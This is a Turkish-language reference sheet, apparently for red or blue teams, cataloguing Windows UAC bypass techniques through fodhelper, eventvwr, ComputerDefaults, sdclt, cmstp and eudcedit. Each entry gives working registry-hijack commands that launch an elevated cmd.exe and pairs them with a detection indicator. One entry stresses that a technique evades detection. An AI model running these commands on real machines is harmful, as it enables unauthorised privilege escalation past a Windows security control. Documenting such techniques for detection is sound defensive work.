

### fodhelper.exe

Windows Features yönetimi. ms-settings registry manipülasyonu ile UAC bypass

**Komut:**
- reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
- reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /f
- fodhelper.exe

**IOC:** ms-settings registry key yazımı ardından fodhelper.exe

---

### eventvwr.exe

Olay görüntüleyici. mscfile registry manipülasyonu ile UAC bypass

**Komut:**
- reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
- eventvwr.exe

**IOC:** mscfile registry key yazımı ardından eventvwr.exe

---

### ComputerDefaults.exe

Varsayılan program ayarları. ms-settings registry manipülasyonu ile UAC bypass

**Komut:**
- reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
- ComputerDefaults.exe
  
**IOC:** ms-settings key değişimi ardından ComputerDefaults

---

### sdclt.exe

Backup & Restore uygulaması. App Paths registry manipülasyonu ile UAC bypass

**Komut:**
- reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /d "cmd.exe" /f
- sdclt.exe

**IOC:** App Paths\control.exe key değişimi ardından sdclt.exe


---

### cmstp.exe

VPN bağlantı profili kurucu. INF dosyası üzerinden UAC bypass ve kod çalıştırma.

**Komut:**
- cmstp.exe /ns /s payload.inf

**IOC:** /ns /s parametreleri birlikte, INF içinde RunPreSetupCommandsSection


---


### eudcedit.exe ⚠️ Az Bilinen

End-User Defined Characters düzenleyici. Belgelenmemiş UAC bypass vektörü.

**Komut:**
- reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
- eudcedit.exe

**IOC:** mscfile key yazımı ardından eudcedit.exe, nadiren görülür — tespit oranı düşük